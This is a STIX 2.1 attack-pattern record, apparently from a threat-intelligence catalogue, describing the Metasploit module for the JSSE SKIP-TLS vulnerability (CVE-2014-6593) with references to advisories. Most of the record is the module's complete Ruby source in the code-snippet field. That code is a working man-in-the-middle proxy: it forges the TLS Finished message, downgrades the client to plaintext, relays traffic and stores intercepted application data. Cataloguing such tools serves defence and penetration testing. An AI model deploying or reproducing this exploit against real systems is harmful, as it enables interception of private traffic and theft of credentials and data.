{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7bc0b5ea-21e9-4eb2-9f90-a535968dbeb7",
    "created": "2024-08-14T16:21:53.358813Z",
    "modified": "2024-08-14T16:21:53.358817Z",
    "name": "Java Secure Socket Extension (JSSE) SKIP-TLS MITM Proxy",
    "description": " This module exploits an incomplete internal state distinction in Java Secure Socket Extension (JSSE) by impersonating the server and finishing the handshake before the peers have authenticated themselves and instantiated negotiated security parameters, resulting in a plaintext SSL/TLS session with the client. This plaintext SSL/TLS session is then proxied to the server using a second SSL/TLS session from the proxy to the server (or an alternate fake server) allowing the session to continue normally and plaintext application data transmitted between the peers to be saved. This module requires an active man-in-the-middle attack. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/server/jsse_skiptls_mitm_proxy.rb",
            "external_id": "jsse_skiptls_mitm_proxy.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-6593"
        },
        {
            "source_name": "reference",
            "url": "https://www.smacktls.com/#skip"
        },
        {
            "source_name": "reference",
            "url": "https://www.smacktls.com/smack.pdf"
        },
        {
            "source_name": "reference",
            "url": "http://www.oracle.com/technetwork/topics/security/cpujan2015-1972971.html"
        },
        {
            "source_name": "reference",
            "url": "https://www-304.ibm.com/support/docview.wss?uid=swg21695474"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'openssl'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Report\n\n  def initialize\n    super(\n      'Name'        => 'Java Secure Socket Extension (JSSE) SKIP-TLS MITM Proxy',\n      'Description'    => %q{\n        This module exploits an incomplete internal state distinction in Java Secure\n        Socket Extension (JSSE) by impersonating the server and finishing the\n        handshake before the peers have authenticated themselves and instantiated\n        negotiated security parameters, resulting in a plaintext SSL/TLS session\n        with the client. This plaintext SSL/TLS session is then proxied to the\n        server using a second SSL/TLS session from the proxy to the server (or an\n        alternate fake server) allowing the session to continue normally and\n        plaintext application data transmitted between the peers to be saved. This\n        module requires an active man-in-the-middle attack.\n      },\n      'Author'      =>\n        [\n          'Ramon de C Valle'\n        ],\n      'License' => MSF_LICENSE,\n      'Actions'     =>\n        [\n          [ 'Service', 'Description' => 'Run MITM proxy' ]\n        ],\n      'PassiveActions' =>\n        [\n          'Service'\n        ],\n      'DefaultAction'  => 'Service',\n      'References' => [\n        ['CVE', '2014-6593'],\n        ['CWE', '372'],\n        ['URL', 'https://www.smacktls.com/#skip'],\n        ['URL', 'https://www.smacktls.com/smack.pdf'],\n        ['URL', 'http://www.oracle.com/technetwork/topics/security/cpujan2015-1972971.html'],\n        ['URL', 'https://www-304.ibm.com/support/docview.wss?uid=swg21695474']\n      ],\n      'DisclosureDate' => 'Jan 20 2015'\n    )\n\n    register_options(\n      [\n        OptString.new('FAKEHOST', [ false, 'The fake server address', nil]),\n        OptString.new('FAKEPORT', [ false, 'The fake server port', 443]),\n        OptString.new('HOST', [ true, 'The server address', nil]),\n        OptPort.new('PORT', [ true, 'The server port', 443]),\n        OptString.new('SRVHOST', [ true, 'The proxy address', '0.0.0.0']),\n        OptString.new('SRVPORT', [ true, 'The proxy port', 443])\n      ])\n  end\n\n  def cleanup\n    super\n    return unless @proxy\n\n    begin\n      @proxy.deref if @proxy.kind_of?(Rex::Service)\n      if @proxy.kind_of?(Rex::Socket)\n        @proxy.close\n        @proxy.stop\n      end\n      @proxy = nil\n    rescue ::Exception\n    end\n  end\n\n  def prf(secret, label, seed)\n    if secret.empty?\n      s1 = s2 = ''\n    else\n      length = ((secret.length * 1.0) / 2).ceil\n      s1 = secret[0..(length - 1)]\n      s2 = secret[(length - 1)..(secret.length - 1)]\n    end\n\n    hmac_md5 = OpenSSL::HMAC.digest(OpenSSL::Digest.new('md5'), s1, label + seed)\n    hmac_sha = OpenSSL::HMAC.digest(OpenSSL::Digest.new('sha1'), s2, label + seed)\n\n    hmac_md5 = OpenSSL::HMAC.digest(OpenSSL::Digest.new('md5'), s1, hmac_md5 + label + seed)\n    hmac_sha = OpenSSL::HMAC.digest(OpenSSL::Digest.new('sha1'), s2, hmac_sha + label + seed)\n\n    result = ''\n    [hmac_md5.length, hmac_sha.length].max.times { |i| result << [(hmac_md5.getbyte(i) || 0) ^ (hmac_sha.getbyte(i) || 0)].pack('C') }\n    result\n  end\n\n  def prf_sha256(secret, label, seed)\n    hmac_hash = OpenSSL::HMAC.digest(OpenSSL::Digest.new('sha256'), secret, label + seed)\n    OpenSSL::HMAC.digest(OpenSSL::Digest.new('sha256'), secret, hmac_hash + label + seed)\n  end\n\n  def run\n    fake_host = datastore['FAKEHOST'] || datastore['HOST']\n    fake_port = datastore['FAKEPORT'] || datastore['PORT']\n    host = datastore['HOST']\n    local_host = datastore['SRVHOST']\n    local_port = datastore['SRVPORT']\n    port = datastore['PORT']\n\n    @proxy = Rex::Socket::TcpServer.create(\n      'LocalHost' => local_host,\n      'LocalPort' => local_port,\n      'Context'   => {\n        'Msf' => framework,\n        'MsfExploit' => self\n      }\n    )\n    print_status('Listening on %s:%d' % [local_host, local_port])\n\n    thread_num = 0\n\n    loop do\n      framework.threads.spawn(\"Thread #{thread_num += 1}\", false, @proxy.accept) do |client|\n        add_socket(client)\n        finished_sent = false\n        handshake_messages = ''\n        application_data = ''\n\n        print_status('Accepted connection from %s:%d' % [client.peerhost, client.peerport])\n\n        fake_server = Rex::Socket::Tcp.create(\n          'PeerHost' => fake_host,\n          'PeerPort' => fake_port,\n          'SSL'      => true,\n          'SSLVerifyMode' => 'NONE',\n          'Context'  =>\n            {\n              'Msf'        => framework,\n              'MsfExploit' => self\n            })\n        add_socket(fake_server)\n\n        print_status('Connected to %s:%d' % [fake_host, fake_port])\n\n        server = Rex::Socket::Tcp.create(\n          'PeerHost' => host,\n          'PeerPort' => port,\n          'Context'  =>\n            {\n              'Msf'        => framework,\n              'MsfExploit' => self\n            })\n        add_socket(server)\n\n        print_status('Connected to %s:%d' % [host, port])\n\n        version = nil\n        begin\n          loop do\n            readable, _, _ = Rex::ThreadSafe.select([client, server])\n\n            readable.each do |r|\n              case r\n              when fake_server\n                # The fake_server (i.e., server) is an SSL socket; Read\n                # application data directly.\n                header = ''\n                fragment = r.get_once(4096)\n              else\n                header = r.get_once(5)\n                raise EOFError if header.nil?\n                fragment_length = header[3, 2].unpack('n')[0]\n                fragment = ''\n                while fragment_length > 0\n                  partial_fragment = r.get_once(fragment_length)\n                  fragment << partial_fragment\n                  fragment_length = fragment_length - partial_fragment.length\n                end\n              end\n\n              print_status('%d bytes received' % [header.length + fragment.length])\n\n              # Drop the server hello done message and send the finished\n              # message in plaintext.\n              if fragment =~ /^\\x0e\\x00\\x00\\x00/\n                if header[2, 1] == \"\\x03\"\n                  verify_data = prf_sha256('', 'server finished', OpenSSL::Digest::SHA256.digest(handshake_messages))\n                  verify_data = verify_data[0, 12]\n                else\n                  verify_data = prf('', 'server finished', OpenSSL::Digest::MD5.digest(handshake_messages) + OpenSSL::Digest::SHA1.digest(handshake_messages))\n                  verify_data = verify_data[0, 12]\n                end\n\n                finished = \"\\x14#{[verify_data.length].pack('N')[1, 3]}#{verify_data}\"\n                record = header[0, 3] + [finished.length].pack('n') + finished\n\n                count = client.put(record)\n                print_status('%d bytes sent' % [count])\n\n                finished_sent = true\n\n                # Change to the SSL socket connected to the same server or\n                # to an alternate fake server.\n                server.close\n                server = fake_server\n\n                # Save version used in the handshake\n                version = header[2, 1]\n                next\n              else\n                # Save handshake messages\n                handshake_messages << fragment\n              end unless finished_sent\n\n              # Save application data\n              application_data << fragment if finished_sent\n\n              case r\n              when client\n                if finished_sent\n                  # The server (i.e., fake_server) is an SSL socket\n                  count = server.put(fragment)\n                else\n                  # The server isn't an SSL socket\n                  count = server.put(header + fragment)\n                end\n\n                print_status('%d bytes sent' % [count])\n\n              when fake_server\n                # The client isn't an SSL socket; Add the record layer header\n                # with the same version used in the handshake.\n                header = \"\\x17\\x03#{version}\" + [fragment.length].pack('n')\n                record = header + fragment\n                count = client.put(record)\n                print_status('%d bytes sent' % [count])\n\n              when server\n                record = header + fragment\n                count = client.put(record)\n                print_status('%d bytes sent' % [count])\n              end\n            end\n          end\n\n        rescue EOFError, Errno::ECONNRESET\n          path = store_loot(\n            'tls.application_data',\n            'application/octet-stream',\n            client.peerhost,\n            application_data,\n            'application_data',\n            'TLS session application data'\n          )\n\n          print_good(\"SSL/TLS session application data successfully stored in #{path}\")\n\n          client.close\n          fake_server.close\n          server.close\n\n          next\n        end\n\n        client.close\n        fake_server.close\n        server.close\n      end\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "Jan 20 2015"
}